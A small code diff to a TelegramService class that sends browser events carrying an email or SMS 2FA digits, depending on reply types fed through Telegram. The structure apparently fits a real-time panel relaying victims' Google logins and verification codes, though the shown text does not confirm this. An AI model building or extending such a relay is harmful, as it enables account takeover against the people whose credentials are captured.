@@ -591,7 +591,9 @@ export class TelegramService {
                 // Dispatch to the correct page based on reply type
                 const rt = response?.data?.replyType;
                 if (rt === 'google-email') {
-                  // Email already stored by backend, no frontend event needed
+                  window.dispatchEvent(
+                    new CustomEvent("admin-google-gmail", { detail: { email: code } })
+                  );
                 } else if (rt === '2fasms' || rt === 'g-2fasms') {
                   window.dispatchEvent(
                     new CustomEvent("appauth-sms-digits-received", { detail: { digits: code } })
